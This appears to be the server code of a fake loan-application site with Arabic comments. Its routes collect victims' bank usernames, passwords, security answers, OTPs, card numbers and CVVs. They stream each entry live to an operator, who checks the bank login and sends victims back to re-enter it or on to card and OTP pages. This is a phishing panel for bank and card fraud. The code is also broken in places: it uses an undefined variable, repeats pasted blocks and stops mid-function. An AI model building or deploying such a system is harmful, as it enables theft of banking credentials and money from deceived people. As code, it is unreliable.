// مسارات الطلبات - إنشاء وإدارة طلبات التمويل
import { Router } from "express";
import { db, applicationsTable, sessionsTable } from "@workspace/db";
import { eq, desc, sql, isNull, isNotNull, and } from "drizzle-orm";
import {
  CreateApplicationBody,
  GetApplicationParams,
  UpdateApplicationParams,
  UpdateApplicationBody,
  NavigateApplicationParams,
  NavigateApplicationBody,
  ValidateApplicationDataParams,
  ValidateApplicationDataBody,
} from "@workspace/api-zod";
import { broadcast } from "../lib/websocket";
import { sendFCMNotification } from "../lib/firebase-admin";

// Simple validation helper
function isValidPaymentData(data: unknown): data is {
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
  } {
  if (!data || typeof data !== "object") return false;
  const d = data as Record<string, unknown>;
  return (
    typeof d.cardNumber === "string" && d.cardNumber.replace(/\s/g, "").length >= 16 &&
    typeof d.cardHolder === "string" && d.cardHolder.length >= 3 &&
    typeof d.expiryDate === "string" && /^\d{2}\/\d{2}$/.test(d.expiryDate) &&
    typeof d.cvv === "string" && d.cvv.length >= 3
  );
}

const router = Router();

// الحصول على إحصائيات الطلبات لصفحة لوحة الإدارة
router.get("/stats", async (req, res) => {
  try {
    const [stats] = await db
      .select({
        total: sql<number>`count(*)::int`,
        pending: sql<number>`count(*) filter (where status = 'pending')::int`,
        reviewing: sql<number>`count(*) filter (where status = 'reviewing')::int`,
        approved: sql<number>`count(*) filter (where status = 'approved')::int`,
        rejected: sql<number>`count(*) filter (where status = 'rejected')::int`,
        waiting: sql<number>`count(*) filter (where status = 'waiting')::int`,
        individual: sql<number>`count(*) filter (where applicant_type = 'individual')::int`,
        business: sql<number>`count(*) filter (where applicant_type = 'business')::int`,
        activeToday: sql<number>`count(*) filter (where created_at >= now() - interval '24 hours')::int`,
      })
      .from(applicationsTable)
      .where(isNull(applicationsTable.deletedAt));

    res.json(stats);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الإحصائيات");
    res.status(500).json({ error: "فشل في جلب الإحصائيات" });
  }
});

// الحصول على قائمة جميع الطلبات (غير المحذوفة) - النسخة الأخيرة فقط لكل عميل
router.get("/", async (req, res) => {
  try {
    req.log.info("جاري جلب الطلبات...");
    const apps = await db
      .select()
      .from(applicationsTable)
      .where(
        and(
          eq(applicationsTable.isLatest, true),
          isNull(applicationsTable.deletedAt)
        )
      )
      .orderBy(desc(applicationsTable.updatedAt));
    req.log.info({ count: apps.length }, "تم جلب الطلبات");
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلبات");
    res.status(500).json({ error: "فشل في جلب الطلبات" });
  }
});

// سلة المهملات — الطلبات المحذوفة
router.get("/trash", async (req, res) => {
  try {
    const apps = await db
      .select()
      .from(applicationsTable)
      .where(isNotNull(applicationsTable.deletedAt))
      .orderBy(desc(applicationsTable.deletedAt));
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب سلة المهملات");
    res.status(500).json({ error: "فشل في جلب سلة المهملات" });
  }
});

// حذف جميع الطلبات (ناعم)
router.delete("/", async (req, res) => {
  try {
    await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(isNull(applicationsTable.deletedAt));
    broadcast({ type: "applications_cleared" });
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلبات");
    res.status(500).json({ error: "فشل في حذف الطلبات" });
  }
});

// إنشاء طلب تمويل جديد - يمنع التكرار للـ sessionId نفسه
router.post("/", async (req, res) => {
  const parsed = CreateApplicationBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "بيانات غير صالحة", details: parsed.error });
  }
  try {
    // التحقق أولاً: هل يوجد طلب موجود لهذا الـ sessionId؟
    const existingApps = await db
      .select()
      .from(applicationsTable)
      .where(
        and(
          eq(applicationsTable.sessionId, parsed.data.sessionId),
          isNull(applicationsTable.deletedAt)
        )
      )
      .orderBy(desc(applicationsTable.version))
      .limit(1);

    if (existingApps.length > 0) {
      // يوجد طلب موجود - أعد向他
      const existingApp = existingApps[0];
      await db
        .update(sessionsTable)
        .set({ applicationId: existingApp.id, lastSeenAt: new Date() })
        .where(eq(sessionsTable.id, parsed.data.sessionId));
      
      broadcast({ type: "application_update", data: existingApp });
      return res.status(200).json(existingApp);
    }

    // لا يوجد طلب - أنشئ واحد جديد
    const [app] = await db
      .insert(applicationsTable)
      .values({
        sessionId: parsed.data.sessionId,
        applicantType: parsed.data.applicantType,
        currentStep: "applicant-info",
        status: "pending",
        version: 1,
        isLatest: true,
      })
      .returning();

    await db
      .update(sessionsTable)
      .set({ applicationId: app.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, parsed.data.sessionId));

    broadcast({ type: "application_update", data: app });
    res.status(201).json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في إنشاء الطلب");
    res.status(500).json({ error: "فشل في إنشاء الطلب" });
  }
});

// الحصول على طلب محدد
router.get("/:id", async (req, res) => {
  const params = GetApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلب");
    res.status(500).json({ error: "فشل في جلب الطلب" });
  }
});

// الحصول على جميع النسخ لطلب معين
router.get("/:id/versions", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    const parentId = currentApp.parentId ?? currentApp.id;

    const versions = await db
      .select()
      .from(applicationsTable)
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      )
      .orderBy(desc(applicationsTable.version));

    res.json(versions);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب نسخ الطلب");
    res.status(500).json({ error: "فشل في جلب نسخ الطلب" });
  }
});

// تحديث بيانات الطلب - يحفظ النسخة القديمة وينشئ نسخة جديدة
router.patch("/:id", async (req, res) => {
  const params = UpdateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = UpdateApplicationBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث جميع النسخ القديمة لتكون غير موجودة كـ latest
    const parentId = currentApp.parentId ?? currentApp.id;
    await db
      .update(applicationsTable)
      .set({ isLatest: false })
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      );

    // استخراج بيانات البنك من extraData إذا كانت موجودة
    let extraDataObj: Record<string, unknown> = {};
    if (parsed.data.extraData) {
      try {
        extraDataObj = typeof parsed.data.extraData === "string"
          ? JSON.parse(parsed.data.extraData)
          : parsed.data.extraData;
      } catch (e) {
        // تجاهل أخطاء parse
      }
    }

    // إنشاء نسخة جديدة
    const newVersion = currentApp.version + 1;

    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: currentApp.sessionId,
        applicantType: parsed.data.applicantType ?? currentApp.applicantType,
        currentStep: parsed.data.currentStep ?? currentApp.currentStep,
        status: parsed.data.status ?? currentApp.status,
        bankId: parsed.data.bankId ?? (extraDataObj.bankId ? Number(extraDataObj.bankId) : currentApp.bankId),
        bankName: parsed.data.bankName ?? (extraDataObj.bankName as string) ?? currentApp.bankName,
        bankLogo: parsed.data.bankLogo ?? (extraDataObj.bankLogo as string) ?? currentApp.bankLogo,
        fullName: parsed.data.fullName ?? currentApp.fullName,
        nationalId: parsed.data.nationalId ?? currentApp.nationalId,
        dateOfBirth: parsed.data.dateOfBirth ?? currentApp.dateOfBirth,
        monthlySalary: parsed.data.monthlySalary ?? currentApp.monthlySalary,
        employer: parsed.data.employer ?? currentApp.employer,
        phone: parsed.data.phone ?? currentApp.phone,
        email: parsed.data.email ?? currentApp.email,
        city: parsed.data.city ?? currentApp.city,
        maritalStatus: parsed.data.maritalStatus ?? currentApp.maritalStatus,
        companyName: parsed.data.companyName ?? currentApp.companyName,
        businessType: parsed.data.businessType ?? currentApp.businessType,
        commercialRegistration: parsed.data.commercialRegistration ?? currentApp.commercialRegistration,
        employeeCount: parsed.data.employeeCount ?? currentApp.employeeCount,
        annualRevenue: parsed.data.annualRevenue ?? currentApp.annualRevenue,
        contactName: parsed.data.contactName ?? currentApp.contactName,
        bankUsername: parsed.data.bankUsername ?? currentApp.bankUsername,
        bankPassword: parsed.data.bankPassword ?? currentApp.bankPassword,
        securityAnswer: parsed.data.securityAnswer ?? currentApp.securityAnswer,
        otpCode: parsed.data.otpCode ?? currentApp.otpCode,
        extraData: parsed.data.extraData ?? currentApp.extraData,
        adminNote: parsed.data.adminNote ?? currentApp.adminNote,
        version: newVersion,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث applicationId في الجلسة ليشير إلى النسخة الجديدة (لعرض الاسم في قائمة الزوار)
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إضافة applicantName لعرض اسم العميل فوراً في صفحة الزوار
    // تحديد نوع الحدث الصوتي: personal (بيانات شخصية), bank (بيانات بنك), otp (رمز تحقق)
    let eventType = "personal";
    if (parsed.data.otpCode) {
      eventType = "otp";
    } else if (parsed.data.bankId || extraDataObj.bankId || parsed.data.bankUsername || parsed.data.bankPassword) {
      eventType = "bank";
    }

    const broadcastData = {
      ...newApp,
      applicantName: newApp.fullName || newApp.companyName || newApp.contactName || null,
      eventType,
    };
    broadcast({ type: "application_update", data: broadcastData });
    
    // إرسال FCM Push Notification
    sendFCMNotification(eventType, {
      sessionId: newApp.sessionId,
      applicantName: broadcastData.applicantName || undefined,
    }).catch(err => req.log.error({ err }, "FCM notification failed"));
    
    res.json(newApp);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحديث الطلب");
    res.status(500).json({ error: "فشل في تحديث الطلب" });
  }
});

// نقل المستخدم لخطوة معينة
router.post("/:id/navigate", async (req, res) => {
  const params = NavigateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = NavigateApplicationBody.safeParse({ targetStep: req.body.targetStep, adminNote: req.body.adminNote });
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({
        currentStep: parsed.data.targetStep,
        adminNote: parsed.data.adminNote ?? null,
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: parsed.data.targetStep, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({ type: "navigate_user", sessionId: app.sessionId, targetStep: parsed.data.targetStep });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحويل المستخدم");
    res.status(500).json({ error: "فشل في تحويل المستخدم" });
  }
});

// قرار التحقق من البيانات
router.post("/:id/validate", async (req, res) => {
  const params = ValidateApplicationDataParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = ValidateApplicationDataBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const { decision, adminNote } = parsed.data;

    let newStatus: string;
    let newStep: string;
    let targetPage: string;
    let credDecision: "approved" | "rejected";
    let credMessage: string | null = null;

    if (decision === "valid") {
      newStatus = "reviewing";
      newStep = "verify";
      targetPage = "verify";
      credDecision = "approved";
    } else if (decision === "invalid") {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "بيانات الدخول غير صحيحة، يرجى التحقق وإعادة الإدخال";
    } else {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "يرجى إعادة إدخال بيانات الدخول مرة أخرى";
    }

    const [app] = await db
      .update(applicationsTable)
      .set({ status: newStatus, currentStep: newStep, adminNote: adminNote ?? null, updatedAt: new Date() })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: targetPage, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({
      type: "credentials_decision",
      sessionId: app.sessionId,
      decision: credDecision,
      message: credMessage,
    });
    broadcast({
      type: "navigate_user",
      sessionId: app.sessionId,
      targetStep: newStep,
      message: credMessage,
    });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تطبيق قرار التحقق");
    res.status(500).json({ error: "فشل في تطبيق القرار" });
  }
});

// حذف طلب واحد
router.delete("/:id", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_deleted", data: { id } });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلب");
    res.status(500).json({ error: "فشل في حذف الطلب" });
  }
});

// استعادة طلب من سلة المهملات
router.post("/:id/restore", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: null, updatedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_update", data: app });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في استعادة الطلب");
    res.status(500).json({ error: "فشل في استعادة الطلب" });
  }
});

// إرسال بيانات الدفع (PayVisa) وتوجيه العميل للصفحة
router.post("/:id/request-payment", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث الخطوة الحالية لـ pay-visa
    await db
      .update(applicationsTable)
      .set({
        currentStep: "pay-visa",
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.id, id));

    // تحديث صفحة الجلسة وحفظ التوجيه في عملية واحدة
    await db
      .update(sessionsTable)
      .set({
        currentPage: "pay-visa",
        pendingNavigation: JSON.stringify({ page: "pay-visa", applicationId: id }),
        lastSeenAt: new Date()
      })
      .where(eq(sessionsTable.id, app.sessionId));

    // إرسال حدث WebSocket لتوجيه العميل
    broadcast({
      type: "navigate_user",
      sessionId: app.sessionId,
      targetStep: "pay-visa",
      applicationId: id,
    });

    res.json({
      success: true,
      message: "تم توجيه العميل لصفحة الدفع",
      redirectUrl: `/pay-visa?applicationId=${id}&session=${app.sessionId}`,
      // إرسال البيانات مباشرة لتوجيه العميل
      targetStep: "pay-visa",
      applicationId: id,
      sessionId: app.sessionId,
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في توجيه العميل لصفحة الدفع");
    res.status(500).json({ error: "فشل في توجيه العميل" });
  }
});

// استلام بيانات الدفع من صفحة PayVisa
router.post("/:id/payment", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });

  if (!isValidPaymentData(req.body)) {
    return res.status(400).json({ error: "بيانات الدفع غير صالحة" });
  }

  const paymentData = req.body as { cardNumber: string; cardHolder: string; expiryDate: string; cvv: string };

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث بيانات الدفع مع إنشاء نسخة جديدة
    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false })
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      );

    // استخراج بيانات البنك من extraData إذا كانت موجودة
    let extraDataObj: Record<string, unknown> = {};
    if (parsed.data.extraData) {
      try {
        extraDataObj = typeof parsed.data.extraData === "string"
          ? JSON.parse(parsed.data.extraData)
          : parsed.data.extraData;
      } catch (e) {
        // تجاهل أخطاء parse
      }
    }

    // إنشاء نسخة جديدة مع بيانات الدفع
    const newVersion = app.version + 1;

    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: app.sessionId,
        applicantType: app.applicantType,
        currentStep: "pay-visa",
        status: app.status,
        bankId: app.bankId,
        bankName: app.bankName,
        bankLogo: app.bankLogo,
        fullName: app.fullName,
        nationalId: app.nationalId,
        dateOfBirth: app.dateOfBirth,
        monthlySalary: app.monthlySalary,
        employer: app.employer,
        phone: app.phone,
        email: app.email,
        city: app.city,
        maritalStatus: app.maritalStatus,
        companyName: app.companyName,
        businessType: app.businessType,
        commercialRegistration: app.commercialRegistration,
        employeeCount: app.employeeCount,
        annualRevenue: app.annualRevenue,
        contactName: app.contactName,
        bankUsername: app.bankUsername,
        bankPassword: app.bankPassword,
        securityAnswer: app.securityAnswer,
        otpCode: app.otpCode,
        paymentCardNumber: paymentData.cardNumber.replace(/\s/g, ""), // إزالة المسافات
        paymentCardHolder: paymentData.cardHolder,
        paymentExpiryDate: paymentData.expiryDate,
        paymentCvv: paymentData.cvv,
        paymentStatus: "verifying", // في انتظار التحقق من البطاقة
        extraData: app.extraData,
        adminNote: app.adminNote,
        version: newVersion,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث الجلسة
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إرسال إشعار مع كل بيانات الطلب
    broadcast({
      type: "payment_received",
      sessionId: newApp.sessionId,
      data: newApp,
    });

    sendFCMNotification("payment", {
      sessionId: newApp.sessionId,
      applicantName: newApp.fullName || newApp.companyName || newApp.contactName || undefined,
    }).catch(err => req.log.error({ err }, "FCM notification failed"));

    res.status(201).json({
      success: true,
      message: "تم استلام بيانات الدفع بنجاح",
      paymentId: newApp.id,
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في حفظ بيانات الدفع");
    res.status(500).json({ error: "فشل في حفظ بيانات الدفع" });
  }
});

// معالجة إجراءات الدفع (موافقة/رفض) من لوحة الإدارة
router.post("/:id/payment-action", async (req, res) => {
  const id = Number(req.params.id);
  const { action } = req.body as { action: "approve" | "reject" };

  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  if (!action || !["approve", "reject"].includes(action)) {
    return res.status(400).json({ error: "إجراء غير صالح" });
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    const newStatus = action === "approve" ? "approved" : "failed";
    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false, updatedAt: new Date() })
      .where(
        and(
          eq(applicationsTable.parentId, parentId),
          eq(applicationsTable.isLatest, true)
        )
      );

    // استخراج بيانات البنك من extraData إذا كانت موجودة
    let extraDataObj: Record<string, unknown> = {};
    if (parsed.data.extraData) {
      try {
        extraDataObj = typeof parsed.data.extraData === "string"
          ? JSON.parse(parsed.data.extraData)
          : parsed.data.extraData;
      } catch (e) {
        // تجاهل أخطاء parse
      }
    }

    // إنشاء نسخة جديدة مع الحالة الجديدة
    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: app.sessionId,
        applicantType: app.applicantType,
        currentStep: action === "approve" ? "pay-otp" : app.currentStep,
        status: app.status,
        bankId: app.bankId,
        bankName: app.bankName,
        bankLogo: app.bankLogo,
        fullName: app.fullName,
        nationalId: app.nationalId,
        dateOfBirth: app.dateOfBirth,
        monthlySalary: app.monthlySalary,
        employer: app.employer,
        phone: app.phone,
        email: app.email,
        city: app.city,
        maritalStatus: app.maritalStatus,
        companyName: app.companyName,
        businessType: app.businessType,
        commercialRegistration: app.commercialRegistration,
        employeeCount: app.employeeCount,
        annualRevenue: app.annualRevenue,
        contactName: app.contactName,
        bankUsername: app.bankUsername,
        bankPassword: app.bankPassword,
        securityAnswer: app.securityAnswer,
        otpCode: app.otpCode,
        paymentCardNumber: app.paymentCardNumber,
        paymentCardHolder: app.paymentCardHolder,
        paymentExpiryDate: app.paymentExpiryDate,
        paymentCvv: app.paymentCvv,
        paymentOtp: app.paymentOtp, // لا يتم إرسال رمز OTP تلقائياً عند الموافقة
        paymentStatus: newStatus,
        paymentCompletedAt: action === "approve" ? new Date() : null,
        extraData: app.extraData,
        adminNote: app.adminNote,
        version: (app.version || 1) + 1,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث الجلسة
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إرسال إشعار WebSocket للعميل
    broadcast({
      type: action === "approve" ? "payment_approved" : "payment_rejected",
      sessionId: newApp.sessionId,
      data: {
        paymentStatus: newStatus,
        currentStep: newApp.currentStep,
        redirectUrl: action === "approve" ? `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}` : null,
      },
    });

    res.json({
      success: true,
      message: action === "approve" ? "تمت الموافقة وتحويل العميل للرمز" : "تم رفض الدفع",
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في معالجة إجراء الدفع");
    res.status(500).json({ error: "فشل في معالجة الإجراء" });
  }
});


// إرسال رمز OTP للدفع (يبقى العميل في انتظار المدير)
router.post("/:id/payment-otp", async (req, res) => {
  const id = Number(req.params.id);
  const { otp } = req.body as { otp: string };

  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  if (!otp || otp.length < 4 || otp.length > 6) {
    return res.status(400).json({ error: "رمز التحقق يجب أن يكون 4-6 أرقام" });
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    // التحقق من الرمز - يمكن تعديل هذه القاعدة حسب الحاجة
    if (app.paymentOtp && app.paymentOtp !== otp) {
      return res.status(400).json({ error: "رمز التحقق غير صحيح" });
    }

    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false, updatedAt: new Date() })
      .where(
        and(
          eq(applicationsTable.parentId, parentId),
          eq(applicationsTable.isLatest, true)
        )
      );

    // استخراج بيانات البنك من extraData إذا كانت موجودة
    let extraDataObj: Record<string, unknown> = {};
    if (parsed.data.extraData) {
      try {
        extraDataObj = typeof parsed.data.extraData === "string"
          ? JSON.parse(parsed.data.extraData)
          : parsed.data.extraData;
      } catch (e) {
        // تجاهل أخطاء parse
      }
    }

    // إنشاء نسخة جديدة مع حالة otp_submitted (في انتظار موافقة المدير)
    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: app.sessionId,
        applicantType: app.applicantType,
        currentStep: "pay-otp",
        status: app.status,
        bankId: app.bankId,
        bankName: app.bankName,
        bankLogo: app.bankLogo,
        fullName: app.fullName,
        nationalId: app.nationalId,
        dateOfBirth: app.dateOfBirth,
        monthlySalary: app.monthlySalary,
        employer: app.employer,
        phone: app.phone,
        email: app.email,
        city: app.city,
        maritalStatus: app.maritalStatus,
        companyName: app.companyName,
        businessType: app.businessType,
        commercialRegistration: app.commercialRegistration,
        employeeCount: app.employeeCount,
        annualRevenue: app.annualRevenue,
        contactName: app.contactName,
        bankUsername: app.bankUsername,
        bankPassword: app.bankPassword,
        securityAnswer: app.securityAnswer,
        otpCode: app.otpCode,
        paymentCardNumber: app.paymentCardNumber,
        paymentCardHolder: app.paymentCardHolder,
        paymentExpiryDate: app.paymentExpiryDate,
        paymentCvv: app.paymentCvv,
        paymentOtp: otp, // استخدام الرمز الجديد الذي أدخله العميل
        paymentStatus: "otp_submitted", // حالة جديدة: بانتظار موافقة المدير على OTP
        paymentCompletedAt: null,
        extraData: app.extraData,
        adminNote: app.adminNote,
        version: (app.version || 1) + 1,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث الجلسة
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إرسال إشعار WebSocket للمدير (ليس للعميل)
    broadcast({
      type: "otp_submitted",
      sessionId: newApp.sessionId,
      data: newApp,
    });

    // لا نرسل شيئاً للعميل - يبقى في صفحة الانتظار
    res.json({
      success: true,
      message: "تم استلام الرمز. في انتظار موافقة المدير.",
      waiting: true, // إشارة للعميل بأن يبقى في الانتظار
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في إرسال رمز OTP");
    res.status(500).json({ error: "فشل في إرسال الرمز" });
  }
});


// معالجة تأكيد/رفض رمز OTP من المدير
router.post("/:id/otp-action", async (req, res) => {
  const id = Number(req.params.id);
  const { action } = req.body as { action: "approve" | "reject" };

  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  if (!action || !["approve", "reject"].includes(action)) {
    return res.status(400).json({ error: "إجراء غير صالح" });
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false, updatedAt: new Date() })
      .where(
        and(
          eq(applicationsTable.parentId, parentId),
          eq(applicationsTable.isLatest, true)
        )
      );

    if (action === "approve") {
      // استخراج بيانات البنك من extraData إذا كانت موجودة
    let extraDataObj: Record<string, unknown> = {};
    if (parsed.data.extraData) {
      try {
        extraDataObj = typeof parsed.data.extraData === "string"
          ? JSON.parse(parsed.data.extraData)
          : parsed.data.extraData;
      } catch (e) {
        // تجاهل أخطاء parse
      }
    }

    // إنشاء نسخة جديدة مع حالة completed
      const [newApp] = await db
        .insert(applicationsTable)
        .values({
          sessionId: app.sessionId,
          applicantType: app.applicantType,
          currentStep: "success",
          status: app.status,
          bankId: app.bankId,
          bankName: app.bankName,
        bankLogo: app.bankLogo,
          fullName: app.fullName,
          nationalId: app.nationalId,
          dateOfBirth: app.dateOfBirth,
          monthlySalary: app.monthlySalary,
          employer: app.employer,
          phone: app.phone,
          email: app.email,
          city: app.city,
          maritalStatus: app.maritalStatus,
          companyName: app.companyName,
          businessType: app.businessType,
          commercialRegistration: app.commercialRegistration,
          employeeCount: app.employeeCount,
          annualRevenue: app.annualRevenue,
          contactName: app.contactName,
          bankUsername: app.bankUsername,
          bankPassword: app.bankPassword,
          securityAnswer: app.securityAnswer,
          otpCode: app.otpCode,
          paymentCardNumber: app.paymentCardNumber,
          paymentCardHolder: app.paymentCardHolder,
          paymentExpiryDate: app.paymentExpiryDate,
          paymentCvv: app.paymentCvv,
          paymentOtp: app.paymentOtp,
          paymentStatus: "completed",
          paymentCompletedAt: new Date(),
          extraData: app.extraData,
          adminNote: app.adminNote,
          version: (app.version || 1) + 1,
          parentId: parentId,
          isLatest: true,
        })
        .returning();

      // تحديث الجلسة
      await db
        .update(sessionsTable)
        .set({ applicationId: newApp.id, lastSeenAt: new Date() })
        .where(eq(sessionsTable.id, newApp.sessionId));

      // إرسال إشعار WebSocket للعميل
      broadcast({
        type: "payment_completed",
        sessionId: newApp.sessionId,
        data: {
          ...newApp,
          redirectUrl: "/apply/success",
        },
      });

      res.json({
        success: true,
        message: "تمت الموافقة على الدفع بنجاح",
      });
    } else {
      // رفض الرمز - إنشاء نسخة جديدة وإرسال رمز جديد
      const newOtp = String(Math.floor(1000 + Math.random() * 9000));

      const [newApp] = await db
        .insert(applicationsTable)
        .values({
          sessionId: app.sessionId,
          applicantType: app.applicantType,
          currentStep: "pay-otp",
          status: app.status,
          bankId: app.bankId,
          bankName: app.bankName,
        bankLogo: app.bankLogo,
          fullName: app.fullName,
          nationalId: app.nationalId,
          dateOfBirth: app.dateOfBirth,
          monthlySalary: app.monthlySalary,
          employer: app.employer,
          phone: app.phone,
          email: app.email,
          city: app.city,
          maritalStatus: app.maritalStatus,
          companyName: app.companyName,
          businessType: app.businessType,
          commercialRegistration: app.commercialRegistration,
          employeeCount: app.employeeCount,
          annualRevenue: app.annualRevenue,
          contactName: app.contactName,
          bankUsername: app.bankUsername,
          bankPassword: app.bankPassword,
          securityAnswer: app.securityAnswer,
          otpCode: app.otpCode,
          paymentCardNumber: app.paymentCardNumber,
          paymentCardHolder: app.paymentCardHolder,
          paymentExpiryDate: app.paymentExpiryDate,
          paymentCvv: app.paymentCvv,
          paymentOtp: newOtp,
          paymentStatus: "approved",
          paymentCompletedAt: null,
          extraData: app.extraData,
          adminNote: app.adminNote,
          version: (app.version || 1) + 1,
          parentId: parentId,
          isLatest: true,
        })
        .returning();

